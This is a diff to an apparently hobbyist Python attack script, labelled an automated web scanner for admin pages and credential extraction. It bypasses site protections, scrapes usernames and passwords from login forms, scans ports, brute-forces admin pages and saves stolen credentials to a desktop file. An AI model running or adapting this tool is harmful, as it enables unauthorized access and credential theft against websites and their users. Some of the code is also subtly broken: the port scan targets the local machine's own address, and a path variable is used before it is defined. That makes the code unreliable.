@@ -5,6 +5,7 @@ from urllib.parse import urljoin
 import subprocess
 import os
 import re
+import socket
 
 print("by hagg4r")
 
@@ -20,7 +21,6 @@ def extract_credentials(form):
         password = password_field["value"] if "value" in password_field.attrs else ""
         return username, password
 
-    # Try to extract credentials using regex patterns
     username_pattern = r'name="username" value="([^"]+)"'
     password_pattern = r'name="password" value="([^"]+)"'
     username = re.search(username_pattern, form.prettify(), re.IGNORECASE)
@@ -57,34 +57,29 @@ def save_results(credentials, filename):
 def main(args):
     session = requests.Session()
 
-    # Bypass initial protections
+    target_ip = socket.gethostbyname(socket.gethostname())
+    print(f"[*] Target IP: {target_ip}")
+
     response = bypass_protection(session, args.url)
 
     soup = BeautifulSoup(response.text, "html.parser")
 
-    # Find login form and extract credentials
     form = soup.find("form", {"method": "post"})
     if form and is_admin_page(args.url):
         username, password = extract_credentials(form)
         if username and password:
             credentials = f"{username}:{password}"
             print(f"[+] Found credentials: {credentials}")
-
-            # Save results to a file on the desktop
             desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') if os.name == 'nt' else os.path.join(os.path.expanduser('~'), 'Desktop')
             result_file = os.path.join(desktop_path, "found_credentials.txt")
             save_results([credentials], result_file)
-
             return
 
-    # Find all links on the page
     links = [urljoin(args.url, a["href"]) for a in soup.find_all("a", href=True)]
 
-    # Scan for open ports
-    open_ports = scan_ports(args.target)
+    open_ports = scan_ports(target_ip)
     print(f"[+] Open ports: {', '.join(open_ports)}")
 
-    # Filter out admin pages and perform brute force
     for link in links:
         if is_admin_page(link):
             print(f"[*] Found potential admin page: {link}")
@@ -96,13 +91,13 @@ def main(args):
                 if username and password:
                     credentials = f"{username}:{password}"
                     print(f"[+] Found credentials: {credentials}")
-
-                    # Save results to a file on the desktop
                     result_file = os.path.join(desktop_path, "found_credentials.txt")
                     save_results([credentials], result_file)
-
                     break
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Automated web scanner for admin pages and credential extraction")
-    parser.add
+    parser.add_argument("url", help="Target URL")
+    args = parser.parse_args()
+
+    main(args)
